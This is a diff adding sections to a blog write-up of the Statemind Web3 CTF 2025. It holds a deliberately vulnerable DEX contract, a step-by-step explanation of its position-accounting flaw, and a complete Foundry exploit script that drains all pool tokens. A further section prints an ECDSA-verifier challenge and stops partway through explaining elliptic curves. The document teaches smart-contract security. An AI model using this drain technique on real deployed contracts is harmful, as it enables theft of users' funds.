@@ -3,7 +3,7 @@ title = "Statemind Web3 CTF 2025"
 date = "2025-01-14"
 
 [taxonomies]
-tags=["ctf", "blockchain", "solidity", "bridge", "defi", "Huff"]
+tags=["ctf", "blockchain", "solidity", "bridge", "defi", "Huff", "evm"]
 
 +++
 
@@ -133,8 +133,8 @@ contract Attack{
     }
 }
 ```
-
 {% end %}
+***
 
 # Proxy
 
@@ -305,6 +305,7 @@ contract NewExecutor is Initializable{
 }
 ```
 {% end %}
+***
 
 # Lending
 
@@ -801,6 +802,7 @@ contract Attack is IUniswapV2Callee {
 }
 ```
 {%end%}
+***
 
 # Yeild
 
@@ -1445,6 +1447,7 @@ contract Attack {
 {%end%}
 
 The exploit takes advantage of the fact that the Yield contract doesn't properly handle extreme price movements in the underlying Uniswap V3 pool, allowing us to manipulate the LP token calculations to our advantage.
+***
 
 
 # Oracle
@@ -2116,6 +2119,7 @@ def price_oracle(i: uint256) -> uint256:
 }
 ```
 {%end%}
+***
 
 # Stablecoin
 
@@ -2835,6 +2839,7 @@ contract StablecoinSolve is Script {
 }
 ```
 {%end%}
+***
 
 # Bridge
 
@@ -3388,11 +3393,1321 @@ contract Attack is ERC1820Implementer, IERC777Sender {
 }
 ```
 {%end%}
+***
 
 # Exchange
 
+P: "You heard there is a new Dex primitive that has launched on-chain with a lot of tokens. As a whitehat hacker, you race to find any bugs before the blackhats do. Can you rescue the tokens from the contract?"
 
+{% note(clickable=true, header="Exchange.sol") %}
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.24;
+
+interface SwapCallback {
+    function doSwap() external;
+}
+
+contract Setup {
+    Exchange public immutable exchange = new Exchange();
+
+    uint256 balance1 = 300_000;
+    uint256 balance2 = 300_000;
+    uint256 balance3 = 600_000;
+
+    Token public token1 = new Token(balance1);
+    Token public token2 = new Token(balance2);
+    Token public token3 = new Token(balance3);
+
+    constructor() {
+        exchange.addToken(address(token1));
+        exchange.addToken(address(token2));
+        exchange.addToken(address(token3));
+
+        token1.approve(address(exchange), balance1);
+        token2.approve(address(exchange), balance2);
+        token3.approve(address(exchange), balance3);
+
+        exchange.addLiquidity(address(token1), address(token2), balance1 / 3, balance2 / 3);
+
+        exchange.addLiquidity(address(token1), address(token3), balance1 / 3, balance3 / 3);
+
+        exchange.addLiquidity(address(token2), address(token3), balance2 / 3, balance3 / 3);
+    }
+
+    function isSolved() public view returns (bool) {
+        return (
+            Token(token1).balanceOf(address(exchange)) == 0 && Token(token2).balanceOf(address(exchange)) == 0
+                && Token(token3).balanceOf(address(exchange)) == 0
+        );
+    }
+}
+
+contract Exchange {
+    struct Pool {
+        uint256 leftReserves;
+        uint256 rightReserves;
+    }
+
+    struct SavedBalance {
+        bool initiated;
+        uint256 balance;
+    }
+
+    struct SwapState {
+        bool hasBegun;
+        uint256 unsettledTokens;
+        mapping(address => int256) positions;
+        mapping(address => SavedBalance) savedBalances;
+    }
+
+    address public admin;
+    uint256 nonce = 0;
+    mapping(address => bool) public allowedTokens;
+    mapping(uint256 => SwapState) private swapStates;
+    mapping(address => mapping(address => Pool)) private pools;
+
+    constructor() {
+        admin = msg.sender;
+    }
+
+    function addToken(address token) public {
+        require(msg.sender == admin, "not admin");
+        allowedTokens[token] = true;
+    }
+
+    modifier duringSwap() {
+        require(swapStates[nonce].hasBegun, "swap not in progress");
+        _;
+    }
+
+    function getSwapState() internal view returns (SwapState storage) {
+        return swapStates[nonce];
+    }
+
+    function getPool(address tokenA, address tokenB)
+        internal
+        view
+        returns (address left, address right, Pool storage pool)
+    {
+        require(tokenA != tokenB);
+
+        if (tokenA < tokenB) {
+            left = tokenA;
+            right = tokenB;
+        } else {
+            left = tokenB;
+            right = tokenA;
+        }
+
+        pool = pools[left][right];
+    }
+
+    function getReserves(address token, address other) public view returns (uint256) {
+        (address left,, Pool storage pool) = getPool(token, other);
+        return token == left ? pool.leftReserves : pool.rightReserves;
+    }
+
+    function setReserves(address token, address other, uint256 amount) internal {
+        (address left,, Pool storage pool) = getPool(token, other);
+
+        if (token == left) pool.leftReserves = amount;
+        else pool.rightReserves = amount;
+    }
+
+    function getLiquidity(address left, address right) public view returns (uint256) {
+        (,, Pool storage pool) = getPool(left, right);
+        return pool.leftReserves * pool.rightReserves;
+    }
+
+    function addLiquidity(address left, address right, uint256 amountLeft, uint256 amountRight) public {
+        require(allowedTokens[left], "token not allowed");
+        require(allowedTokens[right], "token not allowed");
+
+        Token(left).transferFrom(msg.sender, address(this), amountLeft);
+        Token(right).transferFrom(msg.sender, address(this), amountRight);
+
+        setReserves(left, right, getReserves(left, right) + amountLeft);
+        setReserves(right, left, getReserves(right, left) + amountRight);
+    }
+
+    function swap() external {
+        SwapState storage swapState = getSwapState();
+
+        require(!swapState.hasBegun, "swap already in progress");
+        swapState.hasBegun = true;
+
+        SwapCallback(msg.sender).doSwap();
+
+        require(swapState.unsettledTokens == 0, "not settled");
+        nonce += 1;
+    }
+
+    function updatePosition(address token, int256 amount) internal {
+        require(allowedTokens[token], "token not allowed");
+
+        SwapState storage swapState = getSwapState();
+
+        int256 currentPosition = swapState.positions[token];
+        int256 newPosition = currentPosition + amount;
+
+        if (newPosition == 0) swapState.unsettledTokens -= 1;
+        else if (currentPosition == 0) swapState.unsettledTokens += 1;
+
+        swapState.positions[token] = newPosition;
+    }
+
+    function withdraw(address token, uint256 amount) public duringSwap {
+        require(allowedTokens[token], "token not allowed");
+
+        Token(token).transfer(msg.sender, amount);
+        updatePosition(token, -int256(amount));
+    }
+
+    function initiateTransfer(address token) public duringSwap {
+        require(allowedTokens[token], "token not allowed");
+
+        SwapState storage swapState = getSwapState();
+        SavedBalance storage state = swapState.savedBalances[token];
+
+        require(!state.initiated, "transfer already initiated");
+
+        state.initiated = true;
+        state.balance = Token(token).balanceOf(address(this));
+    }
+
+    function finalizeTransfer(address token) public duringSwap {
+        require(allowedTokens[token], "token not allowed");
+
+        SwapState storage swapState = getSwapState();
+        SavedBalance storage state = swapState.savedBalances[token];
+
+        require(state.initiated, "transfer not initiated");
+
+        uint256 balance = Token(token).balanceOf(address(this));
+        uint256 amount = balance - state.balance;
+
+        state.initiated = false;
+        updatePosition(token, int256(amount));
+    }
+
+    function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
+        require(allowedTokens[tokenIn], "token not allowed");
+        require(allowedTokens[tokenOut], "token not allowed");
+
+        uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);
+
+        require(liquidityBefore > 0, "no liquidity");
+
+        uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
+        uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;
+
+        setReserves(tokenIn, tokenOut, newReservesIn);
+        setReserves(tokenOut, tokenIn, newReservesOut);
+
+        uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);
+
+        updatePosition(tokenIn, -int256(amountIn));
+        updatePosition(tokenOut, int256(amountOut));
+
+        require(liquidityAfter >= liquidityBefore, "insufficient liquidity");
+    }
+}
+
+contract Token {
+    uint256 public totalSupply;
+    mapping(address => uint256) balances;
+    mapping(address => mapping(address => uint256)) allowed;
+
+    constructor(uint256 _initialAmount) {
+        balances[msg.sender] = _initialAmount;
+        totalSupply = _initialAmount;
+    }
+
+    function balanceOf(address _owner) public view returns (uint256) {
+        return balances[_owner];
+    }
+
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        require(balances[msg.sender] >= _value);
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+        return true;
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
+        require(allowed[_from][msg.sender] >= _value);
+        require(balances[_from] >= _value);
+        balances[_to] += _value;
+        balances[_from] -= _value;
+        allowed[_from][msg.sender] -= _value;
+        return true;
+    }
+
+    function approve(address _spender, uint256 _value) public returns (bool) {
+        allowed[msg.sender][_spender] = _value;
+        return true;
+    }
+}
+```
+{%end%}
+
+## Solution
+
+What does this protocol is doing? Let's break it down
+
+1. **Setup Contract**
+   - Initializes the exchange with initial liquidity
+   - Creates three tokens (token1, token2, token3) with balances:
+     - token1: 300,000 tokens
+     - token2: 300,000 tokens
+     - token3: 600,000 tokens
+   - Adds initial liquidity pairs:
+     - token1/token2: 100,000 each
+     - token1/token3: 100,000/200,000
+     - token2/token3: 100,000/200,000
+
+2. **Exchange Contract**
+   - Core DEX functionality with unique swap mechanism
+   - Key components:
+     - `Pool`: Tracks reserves for token pairs
+     - `SwapState`: Manages ongoing swap states and positions
+     - `SavedBalance`: Tracks balance snapshots during swaps
+   - Main functions:
+     - `addLiquidity()`: Add tokens to pools
+     - `swap()`: Initiates a swap transaction
+     - `swapTokens()`: Performs the actual token swap
+     - `withdraw()`: Withdraws tokens during a swap
+     - `initiateTransfer/finalizeTransfer`: Two-step transfer process
+
+As usual what's the initial state of the protocol??
+
+```bash
+Player :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
+Setup :  0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B
+Exchange :  0xb3CE3E482D1caf5b444f3f6b95a9d8799f6dac11
+Token1 :  0xa95A2a693880626911bb521CB50b7DC7Caa0EC05
+Token2 :  0x601C3EA942c5Eae7301C39c95342307a17cEc0B7
+Token3 :  0xd5e4b9f37E1b51D18CD2f281B85DCDC07b4540a1
+isSolved() :  false
+Exchange balance Token1 :  200000
+Exchange balance Token2 :  200000
+Exchange balance Token3 :  400000
+Player balance Token1 :  0
+Player balance Token2 :  0
+Player balance Token3 :  0
+```
+
+Okay, Goal is to drain all tokens from the exchange. Lets do this. 
+
+We need to find the function where the token amount is being sent to us. It is the `withdraw()` function.
+
+```solidity
+function withdraw(address token, uint256 amount) public duringSwap {
+    require(allowedTokens[token], "token not allowed");
+
+    Token(token).transfer(msg.sender, amount);
+    updatePosition(token, -int256(amount));
+}
+```
+
+The withdraw function is optimistically sending the amount we are requesting directly to the caller and then updating the position, but first of all the swap should begin (`duringSwap`). For this we can call `swap()` functions to start the swap. 
+
+```solidity
+function swap() external {
+    SwapState storage swapState = getSwapState();
+
+    require(!swapState.hasBegun, "swap already in progress");
+    swapState.hasBegun = true;
+
+    SwapCallback(msg.sender).doSwap();
+
+    require(swapState.unsettledTokens == 0, "not settled");
+    nonce += 1;
+}
+```
+
+If we call the `swap()` function it will callback the `doSwap()` function on the caller. So, Now we can call the `withdraw()` function inside the callback of `doSwap()`. 
+
+Let's see what happens if we withdraw all the `200000` tokens of `Token1`. The withdraw function will send all the `200000` token1 to us but it updates our position.
+
+```solidity
+withdraw( token1, 200000 ) {
+    Token(token).transfer(msg.sender, 200000);
+    updatePosition(token1, -int256(200000));
+}
+
+function updatePosition(address token, int256 amount) internal {
+    require(allowedTokens[token], "token not allowed");
+
+    SwapState storage swapState = getSwapState();
+
+    int256 currentPosition = swapState.positions[token];
+    int256 newPosition = currentPosition + amount;
+
+    if (newPosition == 0) swapState.unsettledTokens -= 1;
+    else if (currentPosition == 0) swapState.unsettledTokens += 1;
+
+    swapState.positions[token] = newPosition;
+}
+```
+
+Now our newPosition becomes `200000` and the `swapState.unsettledTokens = 1` will be updated. So, we need to settle these `unsettledTokens` before completing this swap. If we observe the `swapTokens()` function where we can do swap and the positions are also being updated there.
+
+```solidity
+function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
+    require(allowedTokens[tokenIn], "token not allowed");
+    require(allowedTokens[tokenOut], "token not allowed");
+
+    uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);
+
+    require(liquidityBefore > 0, "no liquidity");
+
+    uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
+    uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;
+
+    setReserves(tokenIn, tokenOut, newReservesIn);
+    setReserves(tokenOut, tokenIn, newReservesOut);
+
+    uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);
+
+    updatePosition(tokenIn, -int256(amountIn));
+    updatePosition(tokenOut, int256(amountOut));
+
+    require(liquidityAfter >= liquidityBefore, "insufficient liquidity");
+}
+```
+The `amountIn` to the `swapTokens()` will be deducted from the current position.
+
+```solidity
+    updatePosition(tokenIn, -int256(amountIn));
+    updatePosition(tokenOut, int256(amountOut));
+```
+
+So lets do these steps, 
+
+```solidity
+Attack1.doSwap() {
+    exchange.withdraw(address(token1), 200000);
+    // 200000 token1 drained
+    // updatePosition() in withdraw:
+    // - currentPosition = 0
+    // - newPosition = 0 - 200000 = -200000
+    // - swapState.unsettledTokens = 1
+    // - swapState.positions[token1] = -200000
+    exchange.swapTokens(address(token1), address(token2), 200000, 0);
+    // updatePosition() for token1 in swapTokens:
+    // - currentPosition = -200000
+    // - newPosition =  -200000 + (-200000)= -400000
+    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
+    // - swapState.positions[token1] = -400000
+
+    // updatePosition() for token2 in swapTokens:
+    // - currentPosition = 0
+    // - newPosition =  0 + 0 = 0
+    // - swapState.unsettledTokens = 0 (newPosition==0)
+    // - swapState.positions[token2] = 0 (because amountOut = 0)
+    // @notice: Here we can observe some inconsistency between state postions and unsettled tokens.
+
+    exchange.withdraw(address(token2), 200000);
+    // 200000 token2 drained
+    // updatePosition() in withdraw:
+    // - currentPosition = 0
+    // - newPosition = 0 - 200000 = -200000
+    // - swapState.unsettledTokens = 1 (currentPosition==0)
+    // - swapState.positions[token2] = -200000
+
+    exchange.swapTokens(address(token2), address(token3), 200000, 0);
+    // updatePosition() for token2 in swapTokens:
+    // - currentPosition = -200000
+    // - newPosition =  -200000 + (-200000)= -400000
+    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
+    // - swapState.positions[token2] = -400000
+
+    // updatePosition() for token3 in swapTokens:
+    // - currentPosition = 0
+    // - newPosition =  0 + 0 = 0
+    // - swapState.unsettledTokens = 0 (newPosition==0)
+    // - swapState.positions[token3] = 0 (because amountOut = 0)
+}
+
+Attack2.doSwap(){
+    exchange.withdraw(address(token3), 400000);
+    // 400000 token3 drained
+    // updatePosition() in withdraw:
+    // - currentPosition = 0
+    // - newPosition = 0 - 400000 = -400000
+    // - swapState.unsettledTokens = 1 (currentPosition==0)
+    // - swapState.positions[token3] = -400000
+
+    exchange.swapTokens(address(token3), address(token1), 400000, 0);
+    // updatePosition() for token3 in swapTokens:
+    // - currentPosition = -400000
+    // - newPosition =  -400000 + (-400000)= -800000
+    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
+    // - swapState.positions[token3] = -800000
+
+    // updatePosition() for token1 in swapTokens:
+    // - currentPosition = 0
+    // - newPosition =  0 + 0 = 0
+    // - swapState.unsettledTokens = 0 (newPosition==0)
+    // - swapState.positions[token1] = 0 (because amountOut = 0)
+}
+```
+
+Don't ask me anything please follow the math explained above. Th issues I see here are, 
+
+- Allowing withdraw() during swap
+- nonce being updated after the swap
+- Inconsistency between `swapState.positions` and `swapState.unsettledTokens`. 
+- Only handling the cases where the `currentPosition == 0 || newPosition == 0`. 
+
+
+{% note(clickable=true, header="Exchange.s.sol") %}
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+import "../src/Exchange.sol";
+
+contract ExchangeSolve is Script {
+    Setup public set = Setup(0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B);
+    Exchange public exchange = set.exchange();
+    Token public token1 = set.token1();
+    Token public token2 = set.token2();
+    Token public token3 = set.token3();
+    address player = vm.envAddress("PLAYER");
+
+    function run() public {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        console.log("Player : ", player);
+        console.log("Setup : ", address(set));
+        console.log("Exchange : ", address(exchange));
+        console.log("Token1 : ", address(token1));
+        console.log("Token2 : ", address(token2));
+        console.log("Token3 : ", address(token3));
+
+        console.log("isSolved() : ", set.isSolved());
+
+        console.log("Exchange balance Token1 : ", token1.balanceOf(address(exchange)));
+        console.log("Exchange balance Token2 : ", token2.balanceOf(address(exchange)));
+        console.log("Exchange balance Token3 : ", token3.balanceOf(address(exchange)));
+        console.log("Player balance Token1 : ", token1.balanceOf(player));
+        console.log("Player balance Token2 : ", token2.balanceOf(player));
+        console.log("Player balance Token3 : ", token3.balanceOf(player));
+
+        Attack attack = new Attack(address(set));
+        attack.exploit();
+        Attack2 attack2 = new Attack2(address(set));
+        attack2.exploit();
+
+        console.log("Exchange balance Token1 : ", token1.balanceOf(address(exchange)));
+        console.log("Exchange balance Token2 : ", token2.balanceOf(address(exchange)));
+        console.log("Exchange balance Token3 : ", token3.balanceOf(address(exchange)));
+        console.log("Attacker balance Token1 : ", token1.balanceOf(address(attack)));
+        console.log("Attacker balance Token2 : ", token2.balanceOf(address(attack)));
+        console.log("Attacker 2 balance Token3 : ", token3.balanceOf(address(attack2)));
+        console.log("isSolved() : ", set.isSolved());
+    }
+
+}
+
+contract Attack is SwapCallback{
+    Setup public set;
+    Exchange public exchange;
+    Token public token1;
+    Token public token2;
+    Token public token3;
+    constructor(address _setup) {
+        set = Setup(_setup);
+        exchange = set.exchange();
+        token1 = set.token1();
+        token2 = set.token2();
+        token3 = set.token3();
+    }
+    function exploit() public {
+        exchange.swap();
+    }
+    function doSwap() public {
+
+        exchange.withdraw(address(token1), 200000);
+        exchange.swapTokens(address(token1), address(token2), 200000, 0);
+
+        exchange.withdraw(address(token2), 200000);
+        exchange.swapTokens(address(token2), address(token3), 200000, 0);
+    }
+}
+
+contract Attack2 is SwapCallback{
+    Setup public set;
+    Exchange public exchange;
+    Token public token1;
+    Token public token2;
+    Token public token3;
+    constructor(address _setup) {
+        set = Setup(_setup);
+        exchange = set.exchange();
+        token1 = set.token1();
+        token2 = set.token2();
+        token3 = set.token3();
+    }
+    function exploit() public {
+        exchange.swap();
+    }
+    function doSwap() public {
+        exchange.withdraw(address(token3), 400000);
+        exchange.swapTokens(address(token3), address(token1), 400000, 0);
+    }
+}
+```
+{%end%}
+***
+
+
+# Fallout
+
+P: "In the aftermath of the Great War, the world lies shattered, but hope endures in the form of Nuka-Cola Caps, the currency of the wasteland. Your mission, should you choose to accept it, is to obtain 1,000,000 Nuka-Cola Caps and secure your place as a true survivor in the barren expanse of post-apocalyptic America."
+
+{% note(clickable=true, header="Fallout.sol") %}
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+import {ERC20} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
+
+contract Fallout is ERC20 {
+    error WrongPlayer();
+    error InvalidSignature();
+
+    uint256 public immutable Qx;
+    uint256 public immutable Qy;
+    address public immutable player;
+    Vault public immutable vault;
+
+    constructor(address _player, Vault _vault, uint256 qx, uint256 qy) ERC20("Nuka-Cola", "CAPS") {
+        Qx = qx;
+        Qy = qy;
+        player = _player;
+        vault = _vault;
+    }
+
+    function mint(
+        address recipient,
+        uint256 value,
+        uint256[2] memory rs
+    ) public {
+        bytes32 hash = keccak256(abi.encode(recipient, value));
+
+        uint256[2] memory Q;
+        Q[0] = Qx;
+        Q[1] = Qy;
+
+        bool valid = vault.validateSignature(hash, rs, Q);
+        if (!valid) {
+            revert InvalidSignature();
+        }
+
+        _mint(recipient, value);
+    }
+
+    function isSolved() public view returns (bool) {
+        return balanceOf(player) >= 1_000_000 ether;
+    }
+}
+
+contract Vault {
+    // Set parameters for curve.
+    uint256 public immutable a;
+    uint256 public immutable b;
+    uint256 public immutable gx;
+    uint256 public immutable gy;
+    uint256 public immutable p;
+
+    constructor(uint256 _a, uint256 _b, uint256 _gx, uint256 _gy, uint256 _p) {
+        a = _a;
+        b = _b;
+        gx = _gx;
+        gy = _gy;
+        p = _p;
+    }
+
+    /**
+     * @dev Inverse of u in the field of modulo m.
+     */
+
+    function inverseMod(uint u, uint m) internal view
+        returns (uint)
+    {
+        if (u == 0 || u == m || m == 0)
+            return 0;
+        if (u > m)
+            u = u % m;
+
+        int t1;
+        int t2 = 1;
+        uint r1 = m;
+        uint r2 = u;
+        uint q;
+
+        while (r2 != 0) {
+            q = r1 / r2;
+            (t1, t2, r1, r2) = (t2, t1 - int(q) * t2, r2, r1 - q * r2);
+        }
+
+        if (t1 < 0)
+            return (m - uint(-t1));
+
+        return uint(t1);
+    }
+
+    /**
+     * @dev Transform affine coordinates into projective coordinates.
+     */
+    function toProjectivePoint(uint x0, uint y0) public view
+        returns (uint[3] memory P)
+    {
+        P[2] = addmod(0, 1, p);
+        P[0] = mulmod(x0, P[2], p);
+        P[1] = mulmod(y0, P[2], p);
+    }
+
+    /**
+     * @dev Add two points in affine coordinates and return projective point.
+     */
+    function addAndReturnProjectivePoint(uint x1, uint y1, uint x2, uint y2) public view
+        returns (uint[3] memory P)
+    {
+        uint x;
+        uint y;
+        (x, y) = add(x1, y1, x2, y2);
+        P = toProjectivePoint(x, y);
+    }
+
+    /**
+     * @dev Transform from projective to affine coordinates.
+     */
+    function toAffinePoint(uint x0, uint y0, uint z0) public view
+        returns (uint x1, uint y1)
+    {
+        uint z0Inv;
+        z0Inv = inverseMod(z0, p);
+        x1 = mulmod(x0, z0Inv, p);
+        y1 = mulmod(y0, z0Inv, p);
+    }
+
+    /**
+     * @dev Return the zero curve in projective coordinates.
+     */
+    function zeroProj() public view
+        returns (uint x, uint y, uint z)
+    {
+        return (0, 1, 0);
+    }
+
+    /**
+     * @dev Return the zero curve in affine coordinates.
+     */
+    function zeroAffine() public view
+        returns (uint x, uint y)
+    {
+        return (0, 0);
+    }
+
+    /**
+     * @dev Check if the curve is the zero curve.
+     */
+    function isZeroCurve(uint x0, uint y0) public view
+        returns (bool isZero)
+    {
+        if(x0 == 0 && y0 == 0) {
+            return true;
+        }
+        return false;
+    }
+
+    /**
+     * @dev Check if a point in affine coordinates is on the curve.
+     */
+    function isOnCurve(uint x, uint y) public view
+        returns (bool)
+    {
+        if (0 == x || x == p || 0 == y || y == p) {
+            return false;
+        }
+
+        uint LHS = mulmod(y, y, p); // y^2
+        uint RHS = mulmod(mulmod(x, x, p), x, p); // x^3
+
+        if (a != 0) {
+            RHS = addmod(RHS, mulmod(x, a, p), p); // x^3 + a*x
+        }
+        if (b != 0) {
+            RHS = addmod(RHS, b, p); // x^3 + a*x + b
+        }
+
+        return LHS == RHS;
+    }
+
+    /**
+     * @dev Double an elliptic curve point in projective coordinates. See
+     * https://www.nayuki.io/page/elliptic-curve-point-addition-in-projective-coordinates
+     */
+    function twiceProj(uint x0, uint y0, uint z0) public view
+        returns (uint x1, uint y1, uint z1)
+    {
+        uint t;
+        uint u;
+        uint v;
+        uint w;
+
+        if(isZeroCurve(x0, y0)) {
+            return zeroProj();
+        }
+
+        u = mulmod(y0, z0, p);
+        u = mulmod(u, 2, p);
+
+        v = mulmod(u, x0, p);
+        v = mulmod(v, y0, p);
+        v = mulmod(v, 2, p);
+
+        x0 = mulmod(x0, x0, p);
+        t = mulmod(x0, 3, p);
+
+        z0 = mulmod(z0, z0, p);
+        z0 = mulmod(z0, a, p);
+        t = addmod(t, z0, p);
+
+        w = mulmod(t, t, p);
+        x0 = mulmod(2, v, p);
+        w = addmod(w, p-x0, p);
+
+        x0 = addmod(v, p-w, p);
+        x0 = mulmod(t, x0, p);
+        y0 = mulmod(y0, u, p);
+        y0 = mulmod(y0, y0, p);
+        y0 = mulmod(2, y0, p);
+        y1 = addmod(x0, p-y0, p);
+
+        x1 = mulmod(u, w, p);
+
+        z1 = mulmod(u, u, p);
+        z1 = mulmod(z1, u, p);
+    }
+
+    /**
+     * @dev Add two elliptic curve points in projective coordinates. See
+     * https://www.nayuki.io/page/elliptic-curve-point-addition-in-projective-coordinates
+     */
+    function addProj(uint x0, uint y0, uint z0, uint x1, uint y1, uint z1) public view
+        returns (uint x2, uint y2, uint z2)
+    {
+        uint t0;
+        uint t1;
+        uint u0;
+        uint u1;
+
+        if (isZeroCurve(x0, y0)) {
+            return (x1, y1, z1);
+        }
+        else if (isZeroCurve(x1, y1)) {
+            return (x0, y0, z0);
+        }
+
+        t0 = mulmod(y0, z1, p);
+        t1 = mulmod(y1, z0, p);
+
+        u0 = mulmod(x0, z1, p);
+        u1 = mulmod(x1, z0, p);
+
+        if (u0 == u1) {
+            if (t0 == t1) {
+                return twiceProj(x0, y0, z0);
+            }
+            else {
+                return zeroProj();
+            }
+        }
+
+        (x2, y2, z2) = addProj2(mulmod(z0, z1, p), u0, u1, t1, t0);
+    }
+
+    /**
+     * @dev Helper function that splits addProj to avoid too many local variables.
+     */
+    function addProj2(uint v, uint u0, uint u1, uint t1, uint t0) private view
+        returns (uint x2, uint y2, uint z2)
+    {
+        uint u;
+        uint u2;
+        uint u3;
+        uint w;
+        uint t;
+
+        t = addmod(t0, p-t1, p);
+        u = addmod(u0, p-u1, p);
+        u2 = mulmod(u, u, p);
+
+        w = mulmod(t, t, p);
+        w = mulmod(w, v, p);
+        u1 = addmod(u1, u0, p);
+        u1 = mulmod(u1, u2, p);
+        w = addmod(w, p-u1, p);
+
+        x2 = mulmod(u, w, p);
+
+        u3 = mulmod(u2, u, p);
+        u0 = mulmod(u0, u2, p);
+        u0 = addmod(u0, p-w, p);
+        t = mulmod(t, u0, p);
+        t0 = mulmod(t0, u3, p);
+
+        y2 = addmod(t, p-t0, p);
+
+        z2 = mulmod(u3, v, p);
+    }
+
+    /**
+     * @dev Add two elliptic curve points in affine coordinates.
+     */
+    function add(uint x0, uint y0, uint x1, uint y1) public view
+        returns (uint, uint)
+    {
+        uint z0;
+
+        (x0, y0, z0) = addProj(x0, y0, 1, x1, y1, 1);
+
+        return toAffinePoint(x0, y0, z0);
+    }
+
+    /**
+     * @dev Double an elliptic curve point in affine coordinates.
+     */
+    function twice(uint x0, uint y0) public view
+        returns (uint, uint)
+    {
+        uint z0;
+
+        (x0, y0, z0) = twiceProj(x0, y0, 1);
+
+        return toAffinePoint(x0, y0, z0);
+    }
+
+    /**
+     * @dev Multiply an elliptic curve point by a 2 power base (i.e., (2^exp)*P)).
+     */
+    function multiplyPowerBase2(uint x0, uint y0, uint exp) public view
+        returns (uint, uint)
+    {
+        uint base2X = x0;
+        uint base2Y = y0;
+        uint base2Z = 1;
+
+        for(uint i = 0; i < exp; i++) {
+            (base2X, base2Y, base2Z) = twiceProj(base2X, base2Y, base2Z);
+        }
+
+        return toAffinePoint(base2X, base2Y, base2Z);
+    }
+
+    /**
+     * @dev Multiply an elliptic curve point by a scalar.
+     */
+    function multiplyScalar(uint x0, uint y0, uint scalar) public view
+        returns (uint x1, uint y1)
+    {
+        if(scalar == 0) {
+            return zeroAffine();
+        }
+        else if (scalar == 1) {
+            return (x0, y0);
+        }
+        else if (scalar == 2) {
+            return twice(x0, y0);
+        }
+
+        uint base2X = x0;
+        uint base2Y = y0;
+        uint base2Z = 1;
+        uint z1 = 1;
+        x1 = x0;
+        y1 = y0;
+
+        if(scalar%2 == 0) {
+            x1 = y1 = 0;
+        }
+
+        scalar = scalar >> 1;
+
+        while(scalar > 0) {
+            (base2X, base2Y, base2Z) = twiceProj(base2X, base2Y, base2Z);
+
+            if(scalar%2 == 1) {
+                (x1, y1, z1) = addProj(base2X, base2Y, base2Z, x1, y1, z1);
+            }
+
+            scalar = scalar >> 1;
+        }
+
+        return toAffinePoint(x1, y1, z1);
+    }
+
+    /**
+     * @dev Multiply the curve's generator point by a scalar.
+     */
+    function multipleGeneratorByScalar(uint scalar) public view
+        returns (uint, uint)
+    {
+        return multiplyScalar(gx, gy, scalar);
+    }
+
+    /**
+     * @dev Validate combination of message, signature, and public key.
+     */
+    function validateSignature(bytes32 message, uint[2] memory rs, uint[2] memory Q) public view
+        returns (bool)
+    {
+        // To disambiguate between public key solutions, include comment below.
+        if(rs[0] == 0 || rs[0] >= p || rs[1] == 0) {// || rs[1] > lowSmax)
+            return false;
+        }
+        if (!isOnCurve(Q[0], Q[1])) {
+            return false;
+        }
+
+        uint x1;
+        uint x2;
+        uint y1;
+        uint y2;
+
+        uint sInv = inverseMod(rs[1], p);
+        (x1, y1) = multiplyScalar(gx, gy, mulmod(uint(message), sInv, p));
+        (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, p));
+        uint[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);
+
+        if (P[2] == 0) {
+            return false;
+        }
+
+        uint Px = inverseMod(P[2], p);
+        Px = mulmod(P[0], mulmod(Px, Px, p), p);
+
+        return Px % p == rs[0];
+    }
+}
+
+```
+{%end%}
+
+## Solution
+
+Aaah.. Mathematics, Cryptography and Smart contracts and elite combination here. The goal is very clear here we need to call the `mint()` function with the amount `1_000_000 ether`. 
+The challenge for us is to pass the signature verification. 
+
+So, what the heck is the math is doing in the solidity smart contract? Well it is an **Elliptic Curve** Cryptography scheme implementation. To be precisely it is a **SECP256R1** curve. 
+
+Now, first learn a bit about the **ECC** and how an implementation looks.
+
+### Elliptic Curve Cryptography
+
+Elliptic Curve Cryptography (ECC) is an asymmetric cryptographic that provides the same level of security as RSA or discrete logarithm systems
+with considerably shorter operands (approximately 160–256 bit vs. 1024–3072 bit). An elliptic curve is a special type of polynomial equation. For cryptographic use, we need to consider the curve not over the real numbers but over a finite field. 
+
+This is how an ECC equations looks like, 
+
+<center> 
+
+\\( E:Y^2 = X^3+aX+b \\) 
+
+<img src="/assets/img/ctf_img/statemind25/statemind_fallout1.png" height = 50% width = 50%>
+
+</center>
+
+There is point P, 2P and a straight line marked on the graph. These are the operations we can perform on Elliptic Curves. Addition of two points (P, Q) will result point R. IF we double the same point (P+P) will result in a 2P. If I did this point addition for `n` times, i.e, \\( Q = n*P \\). Now I'll give you the values of `Q,P` can you find what is `n`? This is where the ECC security lies. 
+
